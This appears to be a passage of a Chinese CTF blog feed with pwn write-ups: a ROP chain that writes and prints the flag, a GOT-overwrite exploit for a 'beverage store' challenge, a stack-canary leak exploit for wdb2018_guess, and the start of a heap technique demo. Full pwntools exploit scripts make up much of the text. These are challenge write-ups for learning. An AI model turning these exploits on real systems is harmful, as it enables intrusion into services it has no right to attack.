class="built_in">chr</span>(char), char_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">al_last=<span class="number">0</span></span><br><span class="line">payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, char_location <span class="keyword">in</span> <span class="built_in">enumerate</span>(char_locations):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">        al_last=flag[i-<span class="number">1</span>]</span><br><span class="line">    payload+=p64(bextr)</span><br><span class="line">    payload+=p64(<span class="number">0x4000</span>)</span><br><span class="line">    payload+=p64(<span class="built_in">int</span>(char_location,<span class="number">16</span>)-al_last-<span class="number">0xd093</span>)</span><br><span class="line">    payload+=p64(xlat)</span><br><span class="line">    payload+=p64(rdi)</span><br><span class="line">    payload+=p64(data_+i)</span><br><span class="line">    payload+=p64(stosb)</span><br></pre></td></tr></table></figure><p>在flag被写入后，我们通过printer函数打印出flag(一次跑不出就多跑几次)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(b&#x27;125.70.243.22&#x27;,31808)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc1=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc1=ELF(&#x27;./lib2shell.so&#x27;)</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;[!] Please input your Username:\n&#x27;</span>,<span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">leak=p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">log.success(<span class="string">f&quot;leak&gt;&gt;<span class="subst">&#123;leak&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_leak=u64(p.recv(6)[:8].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># lg(&quot;libc_leak&quot;,libc_leak)</span></span><br><span class="line"><span class="comment"># libc=libc_leak-0x21b780</span></span><br><span class="line">sa(<span class="string">b&#x27;Please input your password:&#x27;</span>,leak)</span><br><span class="line"><span class="comment"># lg(&#x27;libc&#x27;,libc)</span></span><br><span class="line">sla(<span class="string">&quot;Please enter your authentication code:&quot;</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">data_=<span class="number">0x600298</span></span><br><span class="line">printer=<span class="number">0x400647</span></span><br><span class="line">xlat=<span class="number">0x40064E</span>  <span class="comment">#bx+al-&gt;al</span></span><br><span class="line">bextr=<span class="number">0x400650</span> <span class="comment">#pop rdx rcx rcx-&gt;rbx</span></span><br><span class="line">stosb=<span class="number">0x40065f</span> <span class="comment">#al-&gt;[rdi]</span></span><br><span class="line">rdi=<span class="number">0x0400661</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&quot;flag&quot;</span></span><br><span class="line">char_locations=[]</span><br><span class="line">elf_base=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">next</span>(elf.search(<span class="built_in">bytes</span>([char])))</span><br><span class="line">    char_addr = <span class="built_in">hex</span>(<span class="keyword">match</span> + elf_base)</span><br><span class="line">    char_locations.append(char_addr)</span><br><span class="line">    info(<span class="string">&quot;%s found at %s&quot;</span>, <span class="built_in">chr</span>(char), char_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">al_last=<span class="number">0</span></span><br><span class="line">payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, char_location <span class="keyword">in</span> <span class="built_in">enumerate</span>(char_locations):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">        al_last=flag[i-<span class="number">1</span>]</span><br><span class="line">    payload+=p64(bextr)</span><br><span class="line">    payload+=p64(<span class="number">0x4000</span>)</span><br><span class="line">    payload+=p64(<span class="built_in">int</span>(char_location,<span class="number">16</span>)-al_last-<span class="number">0xd093</span>)</span><br><span class="line">    payload+=p64(xlat)</span><br><span class="line">    payload+=p64(rdi)</span><br><span class="line">    payload+=p64(data_+i)</span><br><span class="line">    payload+=p64(stosb)</span><br><span class="line"></span><br><span class="line">payload_1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+payload+p64(rdi)+p64(data_)+p64(printer)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Login success!&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, payload_1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412120143737.png" alt="flag！！！"></p><h1 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h1><p>题目算是给了半个后门函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412092301836.png" alt="image-20241209230136789"></p><p>我们只需把这个printf变成system，再把函数劫持到system中去即可</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412092303493.png" alt="屏幕截图 2024-12-09 230232"></p><p>scanf处只需输入负数即可修改got表</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412092304707.png" alt="image-20241209230444664"></p><blockquote><p>因此，思路就是，先把exit改成这个函数，实现循环，然后再利用srand或者setvbuf处修获得libc地址，改printf为system，最后改exit为前面半个后门</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;input yours id&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>)</span><br><span class="line">elf = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf.srand(<span class="number">0x61616161</span>)</span><br><span class="line"></span><br><span class="line">v2=elf.rand()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Input yours id authentication code:&#x27;</span>,<span class="built_in">str</span>(v2))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;wine&#x27;</span>,<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;which one to choose&#x27;</span>,p64(<span class="number">0x40133b</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;wine&#x27;</span>,<span class="string">b&#x27;-5&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;which one to choose&#x27;</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;aaaaaaa\n&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x62090</span></span><br><span class="line">lg(<span class="string">&#x27;leak&#x27;</span>,leak)</span><br><span class="line">system=leak+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;wine&#x27;</span>,<span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;which one to choose&#x27;</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;which one to choose&#x27;</span>,p64(<span class="number">0x401511</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>这个<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412120141596.png" alt="image-20241212001651470">师傅在我复现的时候给了我很多的指导，膜拜下</p>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess题解</title>
      <link href="/posts/50488.html"/>
      <url>/posts/50488.html</url>
      
        <content type="html"><![CDATA[<h1 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412022140018.png" alt="image-20241202214011997"></p><blockquote><p>总的来说，这题考的是对__stack_chk_fail得运用，反复用这个获得信息</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是要找到 __libc_argv[0]得地址， __libc_argv[0]存放的是程序名</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412022147908.png" alt="image-20241202214702807"></p><p>循环三次，gets栈溢出，因为有canary保护，检查失败会调用__stack_chk_fail</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412022157842.png" alt="屏幕截图 2024-12-02 213130"></p><p>算出偏移0x128</p><p>我们在目标地址填入puts_got过的libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">0x128</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(puts_got)</span><br></pre></td></tr></table></figure><p>接着获得environ从而获得栈得地址，从而获得flag得位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412022201800.png" alt="屏幕截图 2024-12-02 213709"></p><p>计算处偏移</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27624</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/pwn_tools/buu_libc/16-64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x128</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(environ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Please type your guessing flag\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">flag=stack-<span class="number">0x168</span></span><br><span class="line">get_flag=<span class="string">b&#x27;a&#x27;</span>*offset+p64(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sl(get_flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house_of_rabbit</title>
      <link href="/posts/19914.html"/>
      <url>/posts/19914.html</url>
      
        <content type="html"><![CDATA[<h1 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h1><p>实验版本为ubuntu22.04 (2.35)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication in the tcache.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It would also allow us to perform tcache poisoning if we had a heap leak.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Lets fill up the tcache to force fastbin usage...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line"><span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add it to the fastbin.\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;which corresponds to 